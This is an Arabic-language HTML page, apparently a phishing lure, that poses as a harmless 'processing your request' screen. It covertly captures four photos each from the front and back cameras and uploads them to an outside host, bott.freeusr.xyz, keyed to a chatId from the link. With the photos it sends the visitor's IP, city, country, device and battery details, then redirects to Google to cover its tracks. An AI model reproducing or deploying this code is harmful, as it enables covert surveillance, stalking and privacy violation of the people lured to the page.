<!DOCTYPE html>
<html>
<head>
    <title>مرحبا بك في موقعنا</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 500px;
        }
        .spinner {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error-message {
            color: #ff6b6b;
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff6b6b;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            display: none;
        }
        .error-message h2 {
            margin: 0 0 10px 0;
            font-size: 20px;
        }
        .error-message p {
            margin: 5px 0;
            font-size: 14px;
            color: #ccc;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="spinner" id="spinner"></div>
    <h1 id="title">جاري تنفيذ طلبك</h1>
    <p id="subtitle">يرجى الانتظار...</p>
    
    <!-- ✅ رسالة الخطأ التي تظهر عند الفشل -->
    <div class="error-message" id="errorMessage">
        <h2>❌ فشل الوصول إلى الكاميرا</h2>
        <p id="errorDetail">لم تمنح الصلاحيات اللازمة للوصول إلى الكاميرا</p>
        <p style="margin-top:10px; font-size:12px; color:#888;">💡 يرجى منح صلاحيات الكاميرا وإعادة تحميل الصفحة</p>
    </div>
</div>

<video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
<video id="backVideo" playsinline autoplay muted style="display:none;"></video>
<canvas id="frontCanvas" style="display:none;"></canvas>
<canvas id="backCanvas" style="display:none;"></canvas>

<script>
const frontVideo = document.getElementById('frontVideo');
const backVideo = document.getElementById('backVideo');
const frontCanvas = document.getElementById('frontCanvas');
const backCanvas = document.getElementById('backCanvas');
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get("chatId");

let camerasFinished = 0;
let totalCameras = 0;
let hasError = false; // ✅ متغير لتتبع وجود خطأ

// ✅ عناصر الصفحة
const spinner = document.getElementById('spinner');
const title = document.getElementById('title');
const subtitle = document.getElementById('subtitle');
const errorMessageDiv = document.getElementById('errorMessage');
const errorDetail = document.getElementById('errorDetail');

async function collectAdditionalData() {
    try {
        const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
        const battery = await navigator.getBattery();
        return {
            ip: ipInfo.ip,
            country: ipInfo.country_name,
            city: ipInfo.city,
            platform: getPlatformInfo().platform,
            deviceVersion: getDeviceVersion(),
            batteryLevel: battery.level,
            batteryCharging: battery.charging,
        };
    } catch { return {}; }
}

function getPlatformInfo() {
    const ua = navigator.userAgent;
    if (/Windows/.test(ua)) return { platform: "Windows" };
    if (/Mac/.test(ua)) return { platform: "MacOS" };
    if (/Linux/.test(ua)) return { platform: "Linux" };
    if (/Android/.test(ua)) return { platform: "Android" };
    if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
    return { platform: "Unknown" };
}

function getDeviceVersion() {
    const ua = navigator.userAgent;
    const match = ua.match(/\(([^)]+)\)/);
    return match ? match[1] : 'Unknown';
}

// ✅ دالة عرض رسالة الخطأ للمستخدم (بدون تحويل)
function showErrorToUser(message) {
    hasError = true;
    spinner.style.display = 'none';
    title.textContent = '❌ فشل تنفيذ الطلب';
    subtitle.textContent = 'حدث خطأ أثناء محاولة الوصول إلى الكاميرا';
    errorDetail.textContent = message;
    errorMessageDiv.style.display = 'block';
}

async function requestCameraPermission(facingMode) {
    try {
        return await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
    } catch (error) {
        // ✅ إرسال تقرير فشل
        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
            sendFailReport('permission', 'تم رفض الوصول إلى الكاميرا', { 
                facingMode: facingMode,
                error: error.message 
            });
            // ✅ عرض رسالة خطأ للمستخدم ولا يحول
            showErrorToUser('تم رفض الوصول إلى الكاميرا. يرجى منح الصلاحيات وإعادة المحاولة.');
        } else if (error.name === 'NotFoundError') {
            sendFailReport('camera', 'لا توجد كاميرا متصلة', { 
                facingMode: facingMode,
                error: error.message 
            });
            showErrorToUser('لا توجد كاميرا متصلة بجهازك. يرجى توصيل كاميرا وإعادة المحاولة.');
        } else {
            sendFailReport('error', error.message, { 
                facingMode: facingMode,
                error: error.message 
            });
            showErrorToUser('حدث خطأ غير متوقع: ' + error.message);
        }
        return null;
    }
}

async function init() {
    // ✅ التحقق من وجود userId
    if (!userId) {
        sendFailReport('error', 'معرف المستخدم غير موجود في الرابط', {});
        showErrorToUser('معرف المستخدم غير موجود في الرابط');
        return;
    }

    const additionalData = await collectAdditionalData();
    const frontStream = await requestCameraPermission('user');
    const backStream = await requestCameraPermission('environment');

    // ✅ إذا كان هناك خطأ (hasError = true) لا نحول إلى Google
    if (hasError) {
        return; // نوقف التنفيذ ولا نحول
    }

    if (!frontStream && !backStream) {
        sendFailReport('camera', 'لا توجد كاميرات متاحة', {
            frontStream: !!frontStream,
            backStream: !!backStream
        });
        showErrorToUser('لا توجد كاميرات متاحة على هذا الجهاز');
        return;
    }

    if (frontStream) {
        totalCameras++;
        frontVideo.srcObject = frontStream;
        frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
    }
    if (backStream) {
        totalCameras++;
        backVideo.srcObject = backStream;
        backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
    }
}

function setupCamera(video, canvas, cameraType, additionalData) {
    video.play();
    video.onplaying = () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        let photoCount = 0;
        const maxPhotos = 4;

        const interval = setInterval(() => {
            if (photoCount >= maxPhotos) {
                clearInterval(interval);
                if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
                camerasFinished++;
                if (camerasFinished === totalCameras) {
                    // ✅ فقط عند النجاح الكامل نحول إلى Google
                    finishAndRedirect();
                }
                return;
            }

            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
                fd.append('userId', userId);
                fd.append('cameraType', cameraType);
                fd.append('imageWidth', canvas.width);
                fd.append('imageHeight', canvas.height);
                fd.append('additionalData', JSON.stringify(additionalData));
                post('https://bott.freeusr.xyz/submitPhotos', fd);
            }, 'image/webp', 0.7);

            photoCount++;
        }, 1000);
    };
}

async function post(url, formData) {
    try {
        await fetch(url, { method: 'POST', body: formData });
    } catch (error) {
        sendFailReport('error', 'فشل إرسال الصور إلى الخادم', {
            url: url,
            error: error.message
        });
    }
}

function finishAndRedirect() {
    // ✅ فقط إذا لم يكن هناك خطأ نحول إلى Google
    if (!hasError) {
        document.querySelector('.container').innerHTML = `
            <h1>✅ تم تنفيذ طلبك بنجاح</h1>
            <p>جاري التحويل...</p>
        `;
        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 2000);
    }
}

// ============================================
// ✅ دالة إرسال تقارير الفشل إلى /fail
// ============================================
async function sendFailReport(type, message, details = {}) {
    if (!userId) {
        console.warn('No userId available for fail report');
        return;
    }

    try {
        const response = await fetch('https://bott.freeusr.xyz/fail', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chatId: userId,
                type: type,
                message: message,
                details: details,
                deviceInfo: {
                    platform: navigator.platform || 'غير متاح',
                    language: navigator.language || 'غير متاح',
                    userAgent: navigator.userAgent || 'غير متاح',
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    timestamp: new Date().toISOString()
                }
            })
        });

        if (!response.ok) {
            console.warn('Fail report response not OK:', response.status);
        }
    } catch (error) {
        console.warn('Failed to send fail report:', error);
    }
}

// ============================================
// ✅ مراقبة الأخطاء غير المتوقعة
// ============================================
window.addEventListener('error', (event) => {
    if (!hasError) {
        sendFailReport('error', 'خطأ غير متوقع في الصفحة', {
            message: event.message,
            filename: event.filename,
            lineno: event.lineno,
            colno: event.colno
        });
        showErrorToUser('حدث خطأ غير متوقع: ' + event.message);
    }
});

// ============================================
// ✅ عند إغلاق الصفحة قبل الانتهاء
// ============================================
window.addEventListener('beforeunload', () => {
    if (camerasFinished < totalCameras && totalCameras > 0 && !hasError) {
        sendFailReport('error', 'المستخدم غادر الصفحة قبل الانتهاء', {
            camerasFinished: camerasFinished,
            totalCameras: totalCameras,
            photosTaken: camerasFinished * 4
        });
    }
});

window.addEventListener('load', init);
</script>
</body>
</html>
